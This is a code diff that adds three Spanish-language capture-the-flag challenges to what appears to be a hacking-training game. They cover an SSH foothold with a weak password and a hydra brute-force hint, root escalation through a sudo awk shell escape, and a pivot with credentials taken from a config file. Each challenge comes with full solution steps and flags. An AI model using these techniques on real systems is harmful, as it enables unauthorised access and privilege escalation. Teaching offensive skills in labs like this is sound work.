@@ -212,6 +212,71 @@ export const RETOS: Challenge[] = [
     reward: { xp: 360, coins: 280 },
   },
   {
+    id: "r-yvytu-foothold",
+    title: "Yvytu Cloud: pie en el runner",
+    scenario:
+      "deploy.yvytu.nande es el runner de CI/CD de Yvytu, expuesto. El usuario de servicio 'ci' quedó con una clave floja. Entrá y llevate la bandera de usuario.",
+    objective: "Conseguí foothold como ci y leé user.txt.",
+    flag: "ND{yvytu_foothold}",
+    difficulty: "media",
+    hints: [
+      "Enumerá el host (nmap -sV deploy.yvytu.nande): SSH abierto.",
+      "La clave de ci es débil (nombre + año). Adiviná o brute con hydra.",
+      "connect deploy.yvytu.nande ci Deploy2024   y luego   cat /home/ci/user.txt",
+    ],
+    steps: [
+      "connect deploy.yvytu.nande ci Deploy2024",
+      "cat /home/ci/user.txt",
+    ],
+    courseId: "c-op-killchain",
+    reward: { xp: 130, coins: 100 },
+  },
+  {
+    id: "r-yvytu-root",
+    title: "Yvytu Cloud: de ci a root (sudo awk)",
+    scenario:
+      "Adentro del runner como ci, escalá a root. Le dejaron un sudo NOPASSWD sobre awk (de un script viejo de parseo de logs) — y awk escapa a una shell (GTFOBins). La bandera de root vive en /root, ilegible hasta que escalás.",
+    objective: "Escalá a root abusando sudo awk (GTFOBins) y leé /root/flag.txt.",
+    flag: "ND{yvytu_root}",
+    difficulty: "difícil",
+    hints: [
+      "sudo -l te dice qué podés correr como root sin clave: awk.",
+      "awk puede ejecutar comandos con BEGIN{system(...)}. Como root, eso te da shell de root.",
+      "sudo awk 'BEGIN{system(\"/bin/sh\")}'   y luego   cat /root/flag.txt",
+    ],
+    steps: [
+      "connect deploy.yvytu.nande ci Deploy2024",
+      "sudo -l",
+      "sudo awk 'BEGIN{system(\"/bin/sh\")}'",
+      "cat /root/flag.txt",
+    ],
+    courseId: "c-op-killchain",
+    reward: { xp: 230, coins: 180 },
+  },
+  {
+    id: "r-yvytu-exfil",
+    title: "Yvytu Cloud: robá los artefactos",
+    scenario:
+      "Ya root en el runner, el pipeline guarda en /root la credencial del repositorio de artefactos: artefactos.yvytu.nande, en un segmento interno que sólo se alcanza desde el runner. Pivotá y llevate el secreto de producción — el botín de la cadena.",
+    objective: "Pivotá al repositorio de artefactos interno y leé su /root/flag.txt.",
+    flag: "ND{yvytu_exfil}",
+    difficulty: "difícil",
+    hints: [
+      "Como root en el runner: cat /root/deploy.env revela host y credencial del repo.",
+      "El repo (artefactos.yvytu.nande) sólo se ve desde el runner: pivotá desde ahí.",
+      "connect artefactos.yvytu.nande deployer Art3f@cts!2024   y luego   cat /root/flag.txt",
+    ],
+    steps: [
+      "connect deploy.yvytu.nande ci Deploy2024",
+      "sudo awk 'BEGIN{system(\"/bin/sh\")}'",
+      "cat /root/deploy.env",
+      "connect artefactos.yvytu.nande deployer Art3f@cts!2024",
+      "cat /root/flag.txt",
+    ],
+    courseId: "c-op-killchain",
+    reward: { xp: 320, coins: 250 },
+  },
+  {
     id: "r-web01-user",
     title: "Pie adentro (foothold)",
     scenario:
@@ -574,7 +639,7 @@ export const TRACKS: LearningTrack[] = [
     hue: 0,
     requires: "t-acceso",
     courseIds: ["c-exploit-msf", "c-ad-directorio", "c-op-killchain"],
-    finalChallenges: ["r-ad-dominio", "r-web01-user", "r-privesc-sudo", "r-pivot", "r-lan-nas", "r-lan-restringido", "r-ot-hmi", "r-ot-plc"],
+    finalChallenges: ["r-ad-dominio", "r-web01-user", "r-privesc-sudo", "r-pivot", "r-lan-nas", "r-lan-restringido", "r-ot-hmi", "r-ot-plc", "r-yvytu-foothold", "r-yvytu-root", "r-yvytu-exfil"],
   },
 ];
 
